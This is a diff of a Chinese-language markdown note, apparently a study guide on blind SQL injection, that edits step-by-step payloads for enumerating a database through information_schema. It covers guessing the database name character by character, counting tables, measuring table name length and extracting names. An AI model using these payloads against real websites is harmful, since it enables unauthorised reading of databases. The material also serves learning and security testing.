@@ -72,9 +72,12 @@ and (select ord(substring(database(),1,1))) = 97
 
 4.获取表总数
 ```
-and (select count(table_name) from information_schema.tables where table_schema = database()) = 4
+select count(table_name) from information_schema.tables where table_schema = database()
 ```
 5. 获取表名长度
+```
+SELECT LENGTH (TABLE_NAME) from information_schema.tables where table_schema = DATABASE() LIMIT 0,1
+```
 6. 获取表名
 ```
 SELECT ORD(SUBSTR((select(TABLE_NAME) from information_schema.tables where table_schema = DATABASE() limit 3,1),2,1))
